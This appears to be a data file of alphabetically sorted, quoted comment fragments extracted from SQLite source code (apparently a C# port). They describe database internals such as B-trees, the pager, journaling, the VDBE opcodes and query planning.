" But not for sqlite3_column_blob(), which never calls malloc()."
" But once the trigger terminates, the value returned by this routine"
" But rather than start with 0 or 1, we begin with 'a'.  That way,"
" But the t2.x>0 test will always fail on a NULL row of t2, which"
" By ignoring this last byte of the header, we force the comparison"
" By themselves, these optimizations work fine and provide a handy"
" Bytes in string, or negative "
" C's transaction, where connection C is waiting on connection A. Any"
" CHECK, and UNIQUE constraints are all checked.  If a constraint fails,"
" CONFIG_FPE_FASTFPE option.)  On such systems, floating point"
" CREATE TABLE statement is stored, but case is not significant for"
" CREATE TABLE t(x PRIMARY KEY, y)"
" CREATE TABLE t(x, y, UNIQUE(x, y))"
" CURSOR_INVALID. Otherwise, the cursor is set to point to the first"
" Call the parser to process a CREATE TABLE, INDEX or VIEW."
" Call the value from the second bullet ""nRec"".  nRec is the number of"
" Cannot have triggers on a virtual table. If it were possible,"
" Check if an existing function is being overridden or deleted. If so,"
" Check the size of the database file. If it consists of 0 pages,"
" Check to see if this machine uses EBCDIC.  (Yes, believe it or"
" Clear the error message in pParse, if any"
" Close the transaction, if one was opened. "
" Code an OP_Expire. For an ATTACH statement, set P1 to true (expire this"
" Code external to the Vdbe then ""borrows"" the b-tree cursor and"
" Code it as such, taking care to do the common subexpression"
" Code the <expr> from ""<expr> IN (...)"". The temporary table"
" Code the SELECTs to our left into temporary table ""tab1""."
" Code the current SELECT into temporary table ""tab2"""
" CollSeq.pUser16 is the equivalent for the UTF-16 comparison function,"
" Collating sequence to be reindexed, or NULL "
" Collating sequence with native encoding, or NULL "
" Collating sequence.  If NULL, use the default "
" Column number of X in ""X <op> <expr>"" "
" Commute a comparison operator.  Expressions of the form ""X op Y"""
" Compare the values contained by the two memory cells, returning"
" Compute the Hour, Minute, and Seconds from the julian day number."
" Compute the Year, Month, and Day from the julian day number."
" Configured ""cache_size"" value "
" Conflict algorithm. (OE_Abort, etc) "
" Construct a record from the query result, but instead of"
" Contrary to the intuition of many, [sqlite3_reset()] does not reset"
" Control jumps to here if an error is encountered above, or upon"
" Convert a BLOB literal of the form ""x'hhhhhh'"" into its binary"
" Convert an ansi string to microsoft unicode, based on the"
" Convert microsoft unicode to multibyte character string, based on the"
" Cookie index. 1 for schema-cookie, 6 for user-cookie. "
" Copy data from a buffer to a page, or from a page to a buffer."
" Copy of ""flags"" passed to sqlite3_blob_open() "
" Copy the p->u.zToken string, if any. "
" Copy the triggers, views, and virtual tables from the main database"
" Count rows changed by INSERT, "
" Create a new bitmap object able to handle bits between 0 and iSize,"
" Create a new collating function for database ""db"".  The name is zName"
" Create a new sqlite3_value object, containing the value of pExpr."
" Create labels for the ""break"" and ""continue"" instructions"
" Creates a new file, only if it does not already exist. "
" Current size of the allocation, in elements "
" Current state, using numbers defined in header comment "
" Currently, no such page exists in the page-cache and the"
" Cursor number of X in ""X <op> <expr>"" "
" DbHasProperty( db, iDb, DB_SchemaLoaded ) )"
" Deallocate a register, making available for reuse for some other"
" Decrement the BtShared.nRef counter.  When it reaches zero,"
" Defer sourcing vdbe.h and btree.h until after the ""u8"" and"
" Delete any previous value and set the value stored in pMem to val,"
" Delete existing record, then do INSERT or UPDATE "
" Determine whether or not this is a transaction savepoint. If so,"
" Disable a term in the WHERE clause.  Except, do not disable the term"
" Don't allow access, but don't generate an error "
" Drop any statistics from the sqlite_stat1 table, if it exists "
" Drop every cache entry whose page number is greater than ""pgno"". The"
" Duplicate removal in the UNION, EXCEPT, and INTERSECT cases is handled"
" During a rollback, when the pager reloads information into the cache"
" During expression analysis, extra information is computed and moved into"
" During testing, it is often desirable to move the pending byte to"
" During the search for the best function definition, this procedure"
" During translation, assume that the byte that zTerm points"
" ELSE clause and no other term matches, then the result of the"
" ENABLE_MEMSYS5 is defined, return an error."
" EP_Agg ) != 0 )//HasProperty(pItem.pExpr, EP_Agg) )"
" EP_FromJoin ) == EP_FromJoin ) )// !ExprHasProperty(pE, EP_FromJoin) ){"
" EXCLUSIVE lock. If it were, another process might open the"
" EXCLUSIVE, it means the database file has been changed and any rollback"
" Each btree pages is divided into three sections:  The header, the"
" Each builtin conversion character (ex: the 'd' in ""%d"") is described"
" Each open file is managed by a separate instance of the ""Pager"" structure."
" Each page can be either a btree page, a freelist page or an overflow"
" Each time the application supplied function is invoked, it is passed"
" Either ""ORDER"" or ""GROUP"", as appropriate "
" Either way, check to see if the table already has such an index. If"
" Elements of Context structure type make up the ContextStack, which is"
" End of the 'extern ""C""' block "
" Ensure DROP TABLE is not used on a view, and DROP VIEW is not used"
" Entry point.  Use ""sqlite3_extension_init"" if 0 "
" Evaluate the current GROUP BY terms and store in b0, b1, b2..."
" Even though a malloc() has failed, the implementation of the"
" Even though there is no encoding conversion, value_blob() might"
" Every cursor is tripped, including cursors that belong"
" Ex1.aCol[], hence Ex2.aiColumn[1]==0."
" Ex2, nColumn==2 since 2 of the 3 columns of Ex1 are indexed."
" Except, if argument db is not NULL, then the entry associated with"
" Except, if createFlag is true, that means that we are trying to"
" Except, if there is no possibility of a REPLACE action then"
" Except, in locking_mode=EXCLUSIVE when there is nothing to in"
" Execute the statement pStmt, either until a row of data is ready, the"
" Exit immediately.  All open cursors, etc are closed"
" Expr node.  Or, if an OOM error occurs, set pParse->db->mallocFailed,"
" Expr.flags mask, then Expr.x.pSelect is valid. Otherwise, Expr.x.pList is"
" Expr.x.pList is a list of arguments if the expression is an SQL function,"
" ExprHasAnyProperty( pExpr, EP_FromJoin ) )"
" ExprHasProperty( p.pRight, EP_IntValue )"
" ExprHasProperty( pB, EP_xIsSelect ) )"
" ExprHasProperty( pExpr, EP_DblQuoted ) )"
" ExprHasProperty( pOrig, EP_Agg ) )"
" ExprHasProperty( pTerm.pExpr, EP_FromJoin ) ) )"
" FROM <table2>"" -"
" FROM sub1, sub2), tabB"
" FROM t1, t2 WHERE t1.a=t2.x AND t2.z='ok'"
" FROM t1, t2, t3 WHERE ..."
" FROM tabA, (SELECT "
" FROM table)"") but it has more than 1 result"
" Fall through to the next case, OP_String "
" Figure out if we are dealing with Unix, Windows, or some other"
" Figure out whether to use 1, 2, 4, 6 or 8 bytes. "
" Fill in the Pager.zFilename and Pager.zJournal buffers, if required. "
" Finally,  rollback pages from the sub-journal.  Page that were"
" Finally, if in PAGER_EXCLUSIVE state, then attempt (1). Only"
" Finally, jump back to the beginning of the executable code. "
" Finally, sync the database file. "
" Find the named savepoint. If there is no such savepoint, then an"
" Finially, delete what is left of the subquery and return"
" First make sure the memory subsystem is initialized, then do the"
" First off, code is included that follows the ""include"" declaration"
" Floating or exponential, depending on exponent. %g "
" Following a rollback, the database file should be back in its original"
" Following the above, code to terminate the loop. Label A, the target"
" Following the first call to sqlite3_backup_step(), an exclusive lock is"
" For ASCII, any character with the high-order bit set is"
" For EBCDIC, the rules are more complex but have the same"
" For INTKEY tables, the intKey parameter is used.  pIdxKey"
" For LIKE and GLOB matching on EBCDIC machines, assume that every"
" For ORDER BY, column number in result set "
" For SRT_Output, results are stored in a sequence of registers."
" For TEMP tables, the database name is ""temp""."
" For a BITVEC_SZ of 512, this would be 34,359,739. "
" For a LEFT OUTER JOIN, generate code that will record the fact that"
" For a Real or Integer, use sqlite3_snprintf() to produce the UTF-8"
" For a constraint of the form X=expr, the expression is evaluated and its"
" For a detailed discussion of BTrees, refer to"
" For a table with the INTKEY flag set, this routine returns the key"
" For additional information on what it means to ""expand"" a SELECT"
" For all dirty pages currently in the cache, invoke the specified"
" For an INTKEY table, only the nKey value of the key is used.  pKey is"
" For an attached db, it is an error if the encoding is not the same"
" For an in-memory database, make sure the original page continues"
" For application testing, randomly reverse the output order for"
" For each FROM-clause subquery, add Column.zType and Column.zColl"
" For each attempt at picking an index, the order of tables in the"
" For each cursor required, also allocate a memory cell. Memory"
" For each expression, build an index key from the evaluation and"
" For each nested loop in a WHERE clause implementation, the WhereInfo"
" For errors, it can be some other value.  If P1!=0 then P2 will determine"
" For every """
" For example, assume the string variable zText contains text as follows:"
" For example, before writing to page iRoot:"
" For example, consider table t1(a,b,c,d,e,f) with index i1(a,b,c)."
" For example, given the database schema:"
" For example, if the WHERE clause expression used these VDBE"
" For example, suppose a SrcList initially contains two entries: A,B."
" For example, the free-page-count field is located at byte offset 36 of"
" For example, when writing to a table b-tree with root-page iRoot via"
" For foreign key ""fk1"", the from-table is ""ex1"" and the to-table is ""ex2""."
" For infix functions (LIKE, GLOB, REGEXP, and MATCH) use the"
" For most architectures, this is a no-op."
" For other values of pExpr.op, op is undefined and unused."
" For some database files, the same underlying database cache might be"
" For such expressions, Expr.op is set to TK_COLUMN and Expr.iTable is"
" For testing purposes, we sometimes want to preserve the state of"
" For that reason, we will omit this optimization for now.  See"
" For the entry that cursor pCur is point to, return as"
" For the index called zIdxName which is found in the database iDb,"
" For the main database file, the database name is ""main""."
" For the purposes of this API, a transaction is said to have been"
" For the purposes of this function, a double-quoted string (ex: ""abc"")"
" For the purposes of this routine, a write-cursor is any cursor that"
" For the purposes of this routine, an [INSERT] is considered to"
" For this low-level interface, we know that pPrior!=0.  Cases where"
" For this low-level routine, we already know that pPrior!=0 since"
" For this low-level routine, we are guaranteed that nByte>0 because"
" For this reason, the default name prefix is changed to be ""sqlite"""
" For this routine, we assume the UTF8 string is always zero-terminated."
" For tracing reduce actions, the names of all rules are required."
" For tracing shifts, the names of all terminals and nonterminals"
" Free idxStr using //sqlite3DbFree(db,) if true "
" From another point of view, ""indexable"" means that the subterm could"
" Function arguments or in ""<expr> IN (<expr-list)"" "
" Furthermore, if running in [shared cache mode], the application must"
" Furthermore, the IN is in a WHERE clause and that we really want"
" GLOB, NOT LIKE, and NOT GLOB operators."
" GROUP BY might use an index, DISTINCT never does."
" Generate an expression tree to implement the WHERE, ORDER BY,"
" Generate code to implement the ""ALTER TABLE xxx RENAME TO yyy"""
" Get a list of all dirty pages in the cache, sorted by page number "
" Get a new integer record number (a.k.a ""rowid"") used as the key to a table."
" Get the column information. If aOffset[p2] is non-zero, then"
" Given 1 to 3 identifiers preceeding the JOIN keyword, determine the"
" Given a SELECT statement, generate a Table structure that describes"
" Given a page number of a regular database page, return the page"
" Given a token, return a string that consists of the text of that"
" Given a wildcard parameter name, return the index of the variable"
" Given an expression list, generate a KeyInfo structure that records"
" Given state S and lookahead X, the action is computed as"
" Given table pTab, return a list of all the triggers attached to"
" Given the nKey-byte encoding of a record in pKey[], parse the"
" Given the name of a column of the form X.Y.Z or Y.Z or just Z, look up"
" Google search for ""sqlite"", find the telephone numbers of the"
" Hence for a particular database connection, once malloc starts"
" Hence, a mutex on the BtShared should be held prior to calling"
" Hence, a negative P2 value is a label that has yet to be resolved."
" Hence, if this variable is modified directly, either it should be"
" Hence, the primitive operations for a RowSet are:"
" Here is an interesting observation:  Win95, Win98, and WinME lack"
" Higher level routines should have already started a transaction,"
" However if an error message is supplied, it will be incorporated"
" However, if the file is between 1 and <page-size> bytes in size, then"
" However, some of the ""procedures"" and ""functions"" for modifying and"
" However, the application must guarantee that the destination database"
" However, the error string might be overwritten or deallocated by"
" However, the number returned does not include changes"
" However, the signature of the callback function allows SQLite to pass"
" However, the sqlite3_backup_remaining() and sqlite3_backup_pagecount()"
" However, these macros may also be used to suppress warnings related to"
" INDEXED BY clause attached to it, that the named index is being"
" INDEXED BY clause, then try to locate the specified index. If there"
" INSERT, UPDATE, and DELETE operations against SQLITE_MASTER.  Use"
" IO error occurs while locking the database, checking for a hot-journal"
" IO error while deleting or truncating a journal file. It is unlikely,"
" Identifier from ""INDEXED BY <zIndex>"" clause "
" If ""a"" is the k-th column of table ""t"", then IdList.a[0].idx==k."
" If (X>Y), then when pagerStress is called page X will not be written"
" If >=0, make sure results are distinct "
" If EP_FromJoin, the right table of the join "
" If KeyFetch()/DataFetch() managed to get the entire payload,"
" If M is the size of the prior allocation, then min(N,M) bytes"
" If N is larger than the minimum, use the surplus as an initial"
" If P1 is 0, then all SQL statements become expired. If P1 is non-zero,"
" If P2 is 0 or if the table or index is not empty, fall through"
" If P2 is non-zero, then a write-transaction is started.  A RESERVED lock is"
" If P2 is zero, then a read-lock is obtained on the database file."
" If P3 is greater than zero, then the value stored in register P3 is"
" If P4 is not NULL, then it is the name of the table that P1 is"
" If P5 is not zero, the check is done on the auxiliary database"
" If P5!=0 then use the content of register P2 as the root page, not"
" If Pager.errCode is set, the contents of the pager cache cannot be"
" If Pager.journalSizeLimit is set to a positive, non-zero value, and"
" If PagerSavepoint.iHdrOffset is not zero, then pages are played"
" If SQLITE_ANY is specified, add three versions of the function"
" If SQLITE_CASE_SENSITIVE_LIKE is defined, then the LIKE operator"
" If SQLITE_MALLOC_SOFT_LIMIT is not zero, then try to keep the"
" If SQLITE_OK is returned, then pnTrunc is set to the number of pages"
" If SQLITE_OMIT_AUTOINCREMENT is defined, then the three routines"
" If SQLITE_OMIT_FLOATING_POINT is defined, then none of the floating point"
" If SQLITE_UTF16 is specified as the encoding type, transform this"
" If SQLite is already completely initialized, then this call"
" If SQLite is compiled to support shared-cache mode and to be threadsafe,"
" If SQLite is not threadsafe and does not support shared-cache mode, this"
" If SQLite is not threadsafe but does support shared-cache mode, then"
" If TEMP was specified, then the trigger name may not be qualified. "
" If The value is currently an integer, convert it."
" If [sqlite3_close()] is invoked while a transaction is open,"
" If a HAVING clause is present, then there must be a GROUP BY clause."
" If a MoveTo operation is pending on the given cursor, then do that"
" If a NULL pointer was passed as the collate function, fall through"
" If a column from a table in pSrcList is referenced, then record"
" If a disconnect is attempted while a virtual table is locked,"
" If a hot-journal file is found to exist, "
" If a journal file exists, and there is no RESERVED lock on the"
" If a malloc() failure occurred in sqlite3HashInsert(), it will"
" If a master journal file name is specified, but the file is not"
" If a memory allocation error occurs, return -1."
" If a memory allocation error occurs, the entire list is freed and"
" If a memory allocation fails, SQLITE_NOMEM is returned. If an error"
" If a negative value is passed to this function, then the current"
" If a pointer to a MemPage object is passed as the second argument,"
" If a prior error occurred, this routine should not be called.  ROLLBACK"
" If a register is currently being used by the column cache, then"
" If a statement transaction is started, then a statement journal file"
" If a temporary file is requested, it is not opened immediately."
" If a term is the BETWEEN operator, create two new virtual terms"
" If a transaction is open, the ResetInternalSchema() call above"
" If a transaction is still open on the Btree, roll it back. "
" If a transaction was in progress when this routine is called, that"
" If a transient index is required, create it by calling"
" If a tree that appears to be taller than this is encountered, it is"
" If aOvflSpace is set to a null pointer, this function returns"
" If all of the above are false, then we can run this code just once"
" If all pages in the tree have been visited, return SQLITE_OK to the"
" If all subterms are indexable by a single table T, then set"
" If allocation cannot be made, increment "
" If already in the error state, this function is a no-op.  But on"
" If an AS-name match is found, mark this ORDER BY column as being"
" If an I/O or malloc() error occurs, the journal-file is not deleted"
" If an INDEXED BY clause is used, the bestIndex() function is"
" If an IO error occurs, abandon processing and return the IO error code."
" If an IO error occurs, an SQLITE_IOERR_XXX error code is returned."
" If an IO error occurs, then the IO error is returned to the caller."
" If an IO error within this function, an error code is returned. This"
" If an OOM error occurs, NULL is returned and db->mallocFailed is set."
" If an [INSERT] occurs within a trigger, then the [rowid] of the inserted"
" If an attempt is made to open a locked database, then this routine"
" If an error has been previously detected, we should not be"
" If an error is found, the analysis is cut short."
" If an error occurred in either of the blocks above, free the"
" If an error occurs and pzErrMsg is not 0, then fill pzErrMsg with"
" If an error occurs during a ROLLBACK, we can no longer trust the pager"
" If an error occurs while reading from the journal file, an SQLite"
" If an error occurs within sqlite3_backup_init(), then NULL is returned"
" If an error occurs, "
" If an error occurs, NULL is returned and an error code and error message"
" If an error occurs, SQLITE_NOMEM or an IO error code is returned"
" If an error occurs, an IO error code is returned and the pager"
" If an error occurs, an error message is written to memory obtained"
" If an error occurs, pParse is populated with an error message and a"
" If an error occurs, return NULL and leave a message in pParse."
" If an error occurs, then the value ppPage is set to is undefined. It"
" If an error occurs, this routine returns NULL."
" If an error occurs, we jump here "
" If an exact match is not found, then the cursor is always"
" If an illegal or unsupported join type is seen, then still return"
" If an interface fails with SQLITE_MISUSE, that means the interface"
" If an invalid limit index is supplied, report -1."
" If an out-of-memory error occurs while resizing the array, return"
" If an unlock is omitted, resources leaks will occur.  "
" If another element already exists with the same key, then the"
" If another function was previously registered, its pArg value"
" If another function was previously registered, its"
" If any IO error apart from SQLITE_IOERR_SHORT_READ is encountered,"
" If any auxillary data functions have been called by this user function,"
" If any errors are detected, add an error message to pParse and"
" If any of the values are NULL, take the jump. "
" If any row exist in the result set, record that fact and abort."
" If any writes were made to the BLOB, they might be held in cache"
" If anything goes wrong, an error message is written into pParse."
" If anything goes wrong, set an error in the database connection."
" If argument eOp is false, then nByte bytes of data are copied"
" If argument isClearTable is true, then the entire contents of the"
" If bCloseTrans is true, then this function opened a read transaction"
" If both CollSeq.xCmp and CollSeq.xCmp16 are NULL, it means that the"
" If both are numbers, compare as reals if one is a real, or as integers"
" If both are strings, compare using the collating functions."
" If changing the record number, delete the old record."
" If compiled with SQLITE_DEBUG, then additional logic is inserted"
" If compiling for a processor that lacks floating point support,"
" If control flows to this point, then it was not possible to add the"
" If createFlag is false and nArg is -1, then the first valid"
" If createFlag is false, then a function with the required name and"
" If creating a temp table, the name may not be qualified "
" If cursor P1 refers to an SQL table (B-Tree that uses integer keys),"
" If cursors, triggers, views and subqueries are all omitted from"
" If defined an aSortOrder[i] is true, sort DESC "
" If defined as non-zero, auto-vacuum is enabled by default. Otherwise"
" If dequote is false, no dequoting is performance.  The deQuote"
" If dequote is true, then the token (if it exists) is dequoted."
" If eStatementOp is non-zero, then a statement transaction needs to"
" If either input is NULL, the result is NULL."
" If either operand is NULL, the result is NULL."
" If everything is successful, SQLITE_OK is returned. If an IO error"
" If everything went according to plan, link the new VTable structure"
" If file pFd is open, call sqlite3OsUnlock() on it."
" If flattening is not attempted, this routine is a no-op and returns 0."
" If for some reason, sqlite3_initialize() is unable to initialize"
" If i is less that nField, then there are less fields in this"
" If iCol is less than zero, then the expression requests the"
" If iCol is not valid, return a pointer to a Mem which has a value"
" If iSize<=BITVEC_NBIT, then Bitvec.u.aBitmap[] is a straight"
" If in EXCLUSIVE state, then we update the pager cache if it exists"
" If in an error state other than SQLITE_FULL, then task (1) is"
" If in full-sync mode, advance to the next disk sector before writing"
" If in the future we call sqlite3PagerWrite() on this page, that"
" If isSimpleCount() returns a pointer to a Table structure, then"
" If it does not already exists, create and populate the on-disk file"
" If it does previously exist, all entires associated with table zWhere"
" If it does, record the new maximum blob size."
" If it is SAVEPOINT_RELEASE, then release and destroy the savepoint with"
" If it is a NULL, return 0.0."
" If it is a RELEASE, then destroy the savepoint being operated on too "
" If it is not NULL, SQLite will invoke the destructor"
" If it is not NULL, string zFormat specifies the format of the"
" If it is not NULL, then pColl must point to the database native encoding"
" If it is then return TRUE.  If not, return FALSE."
" If it is, jump to the next iteration of the loop."
" If it is, then ask the code in where.c to attempt to sort results"
" If journal corruption occurs due to a power failure, the most likely"
" If lookaside is already active, return SQLITE_BUSY."
" If mapping failed, close the shared memory handle and erase it "
" If n>=0 then the P4 operand is dynamic, meaning that a copy of"
" If nByte is larger than the maximum string or blob length, then"
" If nFin is zero, this loop runs exactly once and page pLastPg"
" If nRec is 0xffffffff, then this journal was created by a process"
" If nSkip is non-zero, then do not copy the first nSkip bytes of the"
" If needSyncPgno is non-zero, then the journal file needs to be"
" If neither case 1 nor case 2 apply, then leave the eOperator set to"
" If no YMD specified, assume 2000-Jan-01 "
" If no element exists with a matching key, then a new"
" If no error has occured and pPage has an overflow cell, call balance()"
" If no global maximum is configured, then the system attempts to limit"
" If no match is found, search the built-in functions."
" If no match, return 0. "
" If no pending lock has been acquired, then acquire it "
" If no problems are found, store a NULL in register P1."
" If no such instruction is found, then every Statement instruction"
" If no versions of the requested collations sequence are available, or"
" If noContent is true, it means that we do not care about the contents"
" If noContent is true, then the data returned is zeroed instead of"
" If non-zero, replace first 4 bytes with this value "
" If none of the above are defined, then set SQLITE_SYSTEM_MALLOC as"
" If none of the above, then the result destination must be"
" If none of the substrings in the above table are found,"
" If not NULL, sort results using this key "
" If not NULL, the master journal name "
" If not initializing, then create a record for the new table"
" If not negative, use aCol[iPKey] as the primary key "
" If not null, call this function to delete Mem.z "
" If not,"
" If offset iOffset is less than N bytes from the end of the BLOB,"
" If one has been configured, invoke the rollback-hook callback "
" If one of the BtreeCommitPhaseOne() calls fails, this indicates an"
" If one or more of the auxiliary database files has been closed,"
" If one value is NULL, it is less than the other. If both values"
" If one value is a number and the other is not, the number is less."
" If one value is a string and the other is a blob, the string is less."
" If opening a non-empty database, check the text encoding. For the"
" If opening an attached database, the encoding much match ENC(db) "
" If opening the main database, set ENC(db). "
" If p->iStatement is greater than zero, then this Vdbe opened a "
" If p1 is negative, then we begin abs(p1) from the end of x[]."
" If pCur.pKeyInfo is not NULL, then the caller that opened this cursor"
" If pDatabase is not null, it means that the table has an optional"
" If pDbPage is an overflow page, then the first 4 bytes may store a"
" If pDbPage was a btree-page, then it may have child pages and/or cells"
" If pDone is not NULL, then it is a record of pages that have already"
" If pExpr is a column in a virtual table, then let the virtual"
" If pExpr is a column, a reference to a column via an 'AS' alias,"
" If pFile is currently larger than iSize bytes, then truncate it to"
" If pFree is not NULL, it points to the pSpace buffer used"
" If pList==0, it means this routine was called to make a primary"
" If pMem is a string or blob, then we make an attempt to convert"
" If pMem is an integer, then the value is exact.  If pMem is"
" If pMem is an object with a valid string representation, this routine"
" If pMem is not a string object, or the encoding of the string"
" If pMem represents a string value, its encoding might be changed."
" If pOp->p2 is 0, then this opcode is being executed to read a"
" If pOther is already blocked on db, then report SQLITE_LOCKED, to indicate"
" If pPayload is part of the data area of pPage, then make sure pPage"
" If pPgno refers to a pointer-map page, allocate two new pages"
" If pPrior is part of the data area of pPage, then make sure pPage"
" If pSavepoint is NULL, then pages are only played back from the main"
" If pSchema is NULL, then return -1000000. This happens when code in"
" If pTab is a virtual table, call ViewGetColumnNames() to ensure"
" If pTab is really a view, make sure it has been initialized."
" If pVtab is already in the aVTrans array, return early "
" If page 1 is read, then the value of Pager.dbFileVers[] is set to"
" If page 1 was just written, update Pager.dbFileVers to match"
" If page X were not written to the sub-journal here, it would not"
" If page one was fetched successfully, and this function is not"
" If parameter iReg is not negative, code an OP_RealAffinity instruction"
" If parameter isRowid is non-zero, then expression pExpr is guaranteed"
" If parameter nReserve is less than zero, then the number of reserved"
" If payloadSize is 0, then just store a NULL "
" If pnChange is not NULL, then table iTable must be an intkey table. The"
" If possible, rewrite the query to use GROUP BY instead of DISTINCT."
" If ppPage is not NULL, and a reference to the MemPage object corresponding"
" If rMayHaveNull is non-zero, that means that the operation is an IN"
" If rMayHaveNull is zero, that means that the subquery is being used"
" If requesting a write-lock, then the Btree must have an open write"
" If required, populate the overflow page-list cache. "
" If required, this routine calls the 'collation needed' callback to"
" If running in direct mode, write the contents of page 1 to the file. "
" If shared memory could not be created, then close the mutex and fail "
" If so, set the Column.isHidden flag and remove the token from"
" If some other connection is holding an exclusive lock, the"
" If sqlite is being embedded in another program, you may wish to change the"
" If sqlite3SrcListLookup() returns 0, indicating the table does not"
" If sqlite3_backup_step() cannot obtain a required file-system lock, then"
" If sqlite3_prepare returns a tail pointer, we calculate the"
" If sqlite3_realloc() returns NULL, then the prior allocation"
" If sqlite3_unlock_notify() is called in a multi-threaded application,"
" If srcTab and nColumn are both zero, then the pEList expressions"
" If successful, a pointer to the new structure is returned. In this case"
" If successful, open the master journal file for reading."
" If successful, or called on a pager for which it is a no-op, this"
" If successful, ppChild is set to contain a reference to the child"
" If successful, return SQLITE_OK. If an IO error occurs while modifying"
" If successful, set the bit corresponding to pPg.pgno in the bitvecs"
" If successful, sqlite3PcacheMakeClean() is called on the page and"
" If successful, this routine clears the PGHDR_NEED_SYNC flag of every"
" If temporary directory is changed, then invalidateTempStorage."
" If that allocation failed, we would have quit before reaching this"
" If that is the case, then the result must be aligned on an even byte"
" If the ""data"" parameter to this function is NULL, then the"
" If the ""exact"" parameter is not 0, and the page-number nearby exists"
" If the ""nearby"" parameter is not 0, then a (feeble) effort is made to"
" If the ""temp"" database is requested, it may need to be opened by this"
" If the 'x' expression is a column value, or the SELECT..."
" If the B-Tree was successfully opened, set the pager-cache size to the"
" If the BtCursor.isIncrblobHandle flag is set, and the current"
" If the EP_Reduced flag is set in the Expr.flags mask, then no"
" If the EP_TokenOnly flag is set in the Expr.flags mask, then no"
" If the EXPRDUP_REDUCE flag is set, then the return value includes"
" If the EXPRDUP_REDUCE flag is set, then the structure returned is a"
" If the Expr is of type OP_Column, and the table it is selecting from"
" If the INSERT statement included an IDLIST term, then make sure"
" If the LIMIT found in p.iLimit is reached, jump immediately to"
" If the MEM_Null flag is set, then the value is an SQL NULL value."
" If the OPFLAG_NCHANGE flag of P2 is set, then the row change count is"
" If the OPFLAG_NCHANGE flag of P5 is set, then the row change count is"
" If the OP_Column opcode is to be executed on a cursor, then"
" If the P3 value cannot be converted into any kind of a number,"
" If the P3 value is non-zero, then the table referred to must be an"
" If the PRIMARY KEY expression is NULL, then use OP_NewRowid"
" If the PRIMARY KEY is on a single column whose datatype is INTEGER,"
" If the Pager.needSync flag is not set, then this function is a"
" If the SELECT clause is of the restricted form ""SELECT "
" If the SET_FULLSYNC macro is not defined above, then make it"
" If the SQL is a query, then for each row in the query result"
" If the SQL statement being executed returns any data, then [SQLITE_ROW]"
" If the SQL statement does not currently point to a valid row, or if the"
" If the SQLITE_CountRows flag is set in sqlite3.flags mask, then"
" If the SQLITE_SECURE_DELETE compile-time option is enabled, then"
" If the SQLITE_STOREP2 bit of P5 is set, then do not jump.  Instead,"
" If the TEMP database is open, close it and mark the database schema"
" If the TRANSLATE_TRACE macro is defined, the value of each Mem is"
" If the UNPACKED_IGNORE_ROWID flag is set, then the last byte of"
" If the UPACKED_PREFIX_MATCH flag is set, then keys with common prefixes"
" If the VDBE has be run even partially, then transfer the error code"
" If the Vdbe passed as the first argument opened a statement-transaction,"
" If the WHERE clause is empty, the foreach loops must each scan their"
" If the YYNOERRORRECOVERY macro is defined, then do not attempt to"
" If the [SQLITE_OPEN_NOMUTEX] flag is set, then the database connection"
" If the allocation succeeded, populate the new object. "
" If the argument p points to a JournalFile structure, and the underlying"
" If the argument to sqlite3_mutex_enter(), sqlite3_mutex_try(), or"
" If the attempt to load the page into the page-cache fails, (due"
" If the auth function returns SQLITE_IGNORE, change the TK_COLUMN"
" If the auto-commit flag is set to true, then any locks that were held"
" If the b-tree structure is empty, the cursor state is set to"
" If the btree is already in a write-transaction, or it"
" If the busy callback is NULL, then [SQLITE_BUSY] or [SQLITE_IOERR_BLOCKED]"
" If the busy-handler callback returns non-zero, the lock is"
" If the cache contains a page with page-number pgno, remove it"
" If the callback ever returns non-zero, then the program exits"
" If the callback on a commit hook function returns non-zero,"
" If the callback returns non-zero, then another attempt"
" If the caller wants a shared read lock, forward this call"
" If the cell content area begins with a freeblock, remove it. "
" If the cell content will fit on the page, then put it there.  If it"
" If the cell deleted was not located on a leaf page, then the cursor"
" If the cell pCell, part of page pPage contains a pointer"
" If the checksum doesn't add up, then one or more of the disk sectors"
" If the column contains an ""AS <name>"" phrase, use <name> as the name "
" If the column contains fewer than P2 fields, then extract a NULL.  Or,"
" If the column is declared as ""<name> PRIMARY KEY COLLATE <type>"","
" If the condition asserted by this function were not true, and the"
" If the createFlag argument is true, then a new (blank) FuncDef"
" If the cursor already points to the last entry, this is a no-op. "
" If the data is unavailable,  zRec is set to NULL."
" If the database schema changes, instead of returning [SQLITE_SCHEMA] as it"
" If the database schema is shared, then there is one instance of this"
" If the database supports auto-vacuum, and the second or subsequent"
" If the database supports auto-vacuum, make sure no tables contain"
" If the database supports auto-vacuum, write an entry in the pointer-map"
" If the db handle is not NULL, then we must hold the connection handle"
" If the default VFS is unregistered, another VFS is chosen as"
" If the default page cache implementation is overriden, then neither of"
" If the default value of the new column is NULL, then set the file"
" If the destination is an EXISTS(...) expression, the actual"
" If the device does not support the SEQUENTIAL property, then"
" If the double is too large, return 0x8000000000000000."
" If the entry specified is not found and 'create' is true, then create a"
" If the error message is too large for the supplied buffer,"
" If the exFlag argument is false, then acquire at least a RESERVED"
" If the expression evaluates to NULL (neither true nor false), then"
" If the expression is an SQL literal (TK_INTEGER, TK_FLOAT, TK_BLOB,"
" If the expression is of the form ""<expr> <op> X"" it gets commuted"
" If the expression is of the form ""X <op> Y"" where both X and Y are"
" If the expression list pEList contains more than iLimit elements,"
" If the field type is etGENERIC, then convert to either etEXP"
" If the fifth argument has the value [SQLITE_TRANSIENT], then"
" If the file exists, it fails. "
" If the file format and encoding in the database have not been set,"
" If the file is a temp-file has not yet been opened, open it now. It"
" If the file is unlocked, somebody else might change it. The"
" If the file on disk is not the same size as the database image,"
" If the file was opened successfully, read the schema for the new database."
" If the file was successfully opened for read/write access,"
" If the filename is "":memory:"", then a private, temporary in-memory database"
" If the filename is an empty string, then a private, temporary"
" If the final parameter - noSync - is true, then the database file itself"
" If the first argument, db, is not NULL and a malloc() error has occurred,"
" If the first pointer (the memory pointer) is NULL, then SQLite reverts"
" If the flags parameter is non-zero, then the BLOB is opened for read"
" If the following macro is set to 0, the NULLs are indistinct for"
" If the following macro is set to 1, then NULL values are considered"
" If the former, then all row-records are guaranteed to include a value"
" If the fourth argument, isCommit, is non-zero, then this page is being"
" If the fourth parameter is negative, the length of the string is"
" If the function already exists as a regular global function, then"
" If the function is an aggregate function, then the pNC.hasAgg is"
" If the function is registered using the sqlite3_collation_needed() API,"
" If the function returned an error, throw an exception "
" If the handle had any kind of transaction open, decrement the"
" If the handle has a write-transaction open, commit the shared-btrees"
" If the header is read successfully, "
" If the heap pointer is NULL, then restore the malloc implementation"
" If the iStart argument had been 1 instead of 2, then the result"
" If the incremental vacuum is finished after this function has run,"
" If the index name was unqualified, check if the the table"
